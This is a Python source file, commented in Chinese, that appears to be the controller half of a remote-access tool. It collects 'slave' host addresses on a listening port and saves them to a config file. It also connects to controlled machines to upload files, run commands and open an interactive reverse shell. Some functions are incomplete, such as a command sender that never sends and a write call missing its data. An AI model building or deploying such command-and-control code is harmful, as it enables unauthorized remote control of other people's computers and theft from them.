# 和服务器相关的操作

import socket
import sys
import multiprocessing
import threading
import json
import os.path

class BackGround:
    """后台运行 开启服务端口 接收被控制端发送的地址信息
    """
    def __init__(self) -> None:
        #进入控制模式的密码
        self.control_code = "hello"
        self.slave_code = "1"
        
        self.model = {
            "master":self.master_model,
            "slave":self.slave_model
        }
    
    
    def recv_slaveAddr(self,target = "0.0.0.0",port = 9998):
        """接收被控制端的ip和它开启的端口,并将信息保存到配置文件里,方便后续可视化
        用多进程技术

        Args:
            target (_type_): 自己开的ip
            port (_type_): 端口
        """
        print(f"启动背景进程")
        self.background = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.background.bind((target,port))
        self.background.listen(5)
        print(f'[ * ] Listening on {target}:{port}')
        
        # 多进程里的多线程
        while True:
            recv_socket,address = self.background.accept()
            print(f'[ * ] Accepted connection from {address[0]}:{address[1]}')
            
            client_thread = threading.Thread(target=self.deal_recv,args=(recv_socket,))
            client_thread.start()
    
    def deal_recv(self,recv_socket):
        buffer = ""
        # 持续接收数据
        while True:
            msg = recv_socket.recv(1024).decode()
            if not msg:
                break
            else:
                buffer += msg
        # buffer = buffer.decode()
        print(buffer)
        buffer = buffer.replace('\'','\"')
        data = json.loads(buffer)
    
        code = data[0]
        choose_type = None
        
        
        if (code == self.control_code):
            choose_type = "master"  
            output = self.model[choose_type](recv_socket)                      
        elif(code == self.slave_code):
            choose_type = "slave"
            output = self.model[choose_type](data[1:])
        else:
            print("Code is valid")
        

    def master_model(self,master_socket):
        welcome_msg = "Welcome master! Good Luck".encode()
        master_socket.send(welcome_msg)
        
    def slave_model(self,msg):
        slave_ip = msg[0]
        slave_port = msg[1]
        print("[ * ]Slave model")
        print(f"address: {slave_ip}:{slave_port}")
        self.save_config(slave_ip,slave_port)
        
    
    def save_config(self,address,port,config_path="default.ini"):
        
        data = f"{address} {port}"
        # 如果文件不存在新建 存在就追加
        if not os.path.isfile(config_path):
            with open(config_path,"w") as f:
                f.close()
        
        try:
            with open(config_path,"a") as f:
                f.writelines(data+"\n")
                f.close()       
        except Exception as e:
            print(e)
        


class LuckyGirl:
    """Lucky Girl
    """
    def __init__(self,ip,port) -> None:
        self.ip = ip
        self.port = port
        self.passport = 1234
        self.choose = {
            'upload':self.upload,
            'execute':self.execute_command,
            'shell':self.open_shell
        }
        self.show()
    
        

    
    def show(self):
        print(f"ip = {self.ip}")
        print(f"port = {self.port}")
        print(self.choose)
    def upload(self,msg):
        """上传文件
        Args:
            msg (list): 由源地址和目标地址组成的列表
        """
   
        src_path = msg[0]
        dst_path = msg[1]
        file_buffer = ""
        # print(f"src = {src_path}")
        # print(f"dst = {dst_path}")
        
        if(len(src_path)):
            try:
                with open(src_path,'r') as f:
                    file_buffer = f.read()
                    f.close()
                
                # 装包 ['命令',[内容]]
                packet = ['upload']
                data = [dst_path,file_buffer]
                packet.append(data)
                print(str(packet))
                self.direct_send(packet)
                
                #self.socket.send(file_buffer)
                return True
                    
            except Exception as e:
                print(e)
        
        return False
    def execute_command(self,msg):
        """直接执行对应的系列命令,然后接收or不接收结果 要么直接执行文件内容的命令 这里以直接单行

        Args:
            msg (list): [type,save_path,command],type:0 or 1,0为不接受结果,1为接收返回结果
        """
        flag = False
        command_type = msg[0]
        if command_type == 0:
            command = msg[1]
        else:
            save_path = msg[1]
            command = msg[2]
            flag = True
        
        #发送数据 ...
        
        
        
        # 保存返回结果
        if flag:
            try:
                with open(save_path,'wb') as f:
                    f.write()
                    f.close()
            except Exception as e:
                print(e)
            
    def open_shell(self,msg):
        """打开反弹shell

        Args:
            msg (list): ['shell','type']第二个参数为样式
        """
        end_flag = "exit"
        # shell_type = msg[1]
        recv_len = 1
        response = ''
        
        #发送命令
        output = self.direct_send(msg)
       
        try:
            while True:
            #shell一行一行交互
                
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    
                    if(recv_len < 4096):
                        break
                
                if(response):
                    print(response)
                    
                buffer = sys.stdin.readline()
                print(f"buffer = {buffer}")
                
                if(buffer.rstrip() == end_flag):
                    break
                else:
                    self.socket.send(buffer.encode())
                    print(f"[ * ] Send: {buffer}")
                
            self.socket.send((end_flag+"\n").encode())
        except:
            pass
    
    
    def connect_server(self):
        """连接目标机器，且进行初始化操作,获得socket

        """
        self.socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            self.socket.connect((self.ip,self.port))
            #对密码
            #self.socket.send(self.passport)
           
        except Exception as e:
            print("[*] Exception ! Exiting.")
            print(e)
    
    def direct_send(self,msg):
        """将list数据转换成能够直接发送的数据,并且发送

        Args:
            msg (list): _description_
        """
        try:
            data = str(msg).encode()
            self.socket.send(data)
            return True
        except Exception as e:
            print(e)
            
        return False
   
    
    def send_msg(self,type,msg):
        
        print (f"type = {type}")
        print (f"msg = {msg}")
        # 执行对应的命令 从字典选取对应的type的func，然后第二个参数的传递的信息
        try:
            out = self.choose[type](msg)
        except Exception as e:
            print(e)
        
        # self.disconnet_server()
    
    def disconnet_server(self):
        self.socket.close()


if __name__ == "__main__":
    a = LuckyGirl('127.0.0.1',12345)
    
    a.connect_server()
    a.send_msg('shell',['shell','Bxx#>'])
    # a.choose['upload']()
    
    # b = BackGround()
    # background_process = multiprocessing.Process(target=b.recv_slaveAddr)
    # background_process.start()
    pass
    
